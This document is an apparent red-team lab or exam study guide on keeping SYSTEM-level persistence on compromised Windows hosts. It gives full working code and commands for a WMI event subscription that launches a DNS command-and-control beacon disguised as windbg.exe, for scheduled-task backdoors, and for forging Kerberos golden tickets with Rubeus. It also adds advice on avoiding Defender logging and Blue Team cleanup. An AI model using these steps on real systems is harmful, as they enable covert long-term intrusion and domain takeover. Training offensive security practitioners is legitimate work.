# Elevated Persistence Lab

> **Methodology context:** This is **Phase 7 — Elevated Persistence**. Deploy after you have a SYSTEM beacon (from Phase 6 Privilege Escalation). This is your second persistence layer — if the user-level COM hijack (Phase 4) is cleaned up by Blue Team, this WMI subscription brings you back without requiring a user to log in.

> **Why DNS beacon, not HTTP:**
> - DNS C2 traffic blends with normal DNS queries — harder to block without disrupting the network
> - HTTP listener may be rate-limited or inspected on port 80; DNS is rarely firewalled internally
> - The WMI trigger runs as SYSTEM in a headless context (no user session) — DNS survives where HTTP might fail in restricted environments
> - Exam pattern: DNS for elevated/SYSTEM persistence, HTTP/SMB for interactive beacons

----

## WmiPersistence.ps1 — WMI GPO Event Subscription  

1. Create new file `C:\Tools\WmiPersistence.ps1`  
2. Paste code below  

```powershell
function Add-WmiPersistence
{
   $EventFilterArgs = @{
      EventNamespace = 'root/cimv2'
      Name           = "Debug Trace"
      Query          = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"
      QueryLanguage  = 'WQL'
   }
   $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

   $CommandLineConsumerArgs = @{
      Name                = "Debug Consumer"
      CommandLineTemplate = "C:\Windows\System32\windbg.exe -trace"
   }
   $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

   $FilterToConsumerArgs = @{
      Filter   = $Filter
      Consumer = $Consumer
   }
   Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
}

function Remove-WmiPersistence
{
    Get-WMIObject -Namespace root/Subscription -Class __EventFilter         -Filter "Name='Debug Trace'"    | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject -Verbose
}
```

>This will trigger when the computer updates its Group Policy Objects.  
3. Generate a DNS payload.  
```
Payloads > Windows Stageless Payload
Listener: dns
Click Generate
Save to C:\Payloads\dns_x64.exe
```
4. Interact with the SYSTEM Beacon.  
5. Upload the payload.
```
upload C:\Payloads\dns_x64.exe
mv dns_x64.exe windbg.exe
```
6. Install the backdoor (using self-injection).  
```
powershell-import C:\Tools\WmiPersistence.ps1
psinject [BEACON PID] x64 Add-WmiPersistence
```
7. Trigger the backdoor (can be done in Beacon)
```
execute gpupdate /target:computer /force
```

----  

### Scheduled Task (Backup Persistence)

| Risk | Command | Why |
|------|---------|-----|
| `OPSEC-CAUTION` ✅ | `powerpick Register-ScheduledTask -TaskName 'WindowsDebugHelper' -Action (New-ScheduledTaskAction -Execute 'C:\Windows\Temp\windbg.exe') -Trigger (New-ScheduledTaskTrigger -AtStartup) -RunLevel Highest -User 'SYSTEM' -Force` | No `powershell.exe`. Task XML written to disk (always — unavoidable), Event 4698 fires. |
| `OPSEC-CAUTION` ✅ | `execute-assembly SharPersist.exe -t schtask -c "C:\Windows\Temp\windbg.exe" -n "WindowsDebugHelper" -m add -o logon` | Fork & run (spawnto process). Same Event 4698 detection as above but no `powershell.exe`. |
| `OPSEC-UNSAFE` ❌ | `shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\windbg.exe" /sc onstart /ru SYSTEM /f` | Spawns `cmd.exe` + `schtasks.exe`. Command line logged by Defender kernel callbacks. |

> **Exam rule:** If the operation has a `powerpick` equivalent, always use `powerpick` over `shell`. If it has an `execute-assembly` equivalent, prefer that over `shell`. Only fall back to `shell` when there is genuinely no alternative — and flag it as UNSAFE in your documentation for the OPSEC scoring criteria.

### Golden Ticket — Best OPSEC Elevated Persistence (no binary on disk)

Once you have the `krbtgt` AES256 hash from DCSync, you can forge DA-level Kerberos tickets at will — no binary on disk, no WMI subscription, no scheduled task:

```cs
// On attacker desktop (NOT in beacon — run locally)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:contoso.com /sid:<domain-SID> /aes256:<krbtgt-aes256> /outfile:C:\Users\Attacker\Desktop\golden

// Inject into beacon session when needed
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN].kirbi
beacon> run klist
beacon> ls \\lon-dc-1\c$   // verify DA access
```

> **Why this is the best persistence:** No process runs on target machines. No file written to target. Ticket lives in the attacker's memory only. Survives until `krbtgt` password is rotated (default 60 days; detection is DCSync event 4662 at collection time, not at use time).

### Scheduled Task — Backup if WMI is Monitored

```cs
// OPSEC-CAUTION — task XML written to C:\Windows\System32\Tasks\, Event 4698
beacon> powerpick $action = New-ScheduledTaskAction -Execute 'C:\Windows\Temp\windbg.exe'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName 'WindowsDebugHelper' -Action $action -Trigger $trigger -RunLevel Highest -User 'SYSTEM' -Force

// Verify
beacon> powerpick Get-ScheduledTask -TaskName 'WindowsDebugHelper'

// Cleanup
beacon> powerpick Unregister-ScheduledTask -TaskName 'WindowsDebugHelper' -Confirm:$false
```

> **Avoid `shell schtasks /create`** — spawns `cmd.exe` as child of beacon (OPSEC-UNSAFE). Always use `powerpick` with the `ScheduledTask` cmdlets.


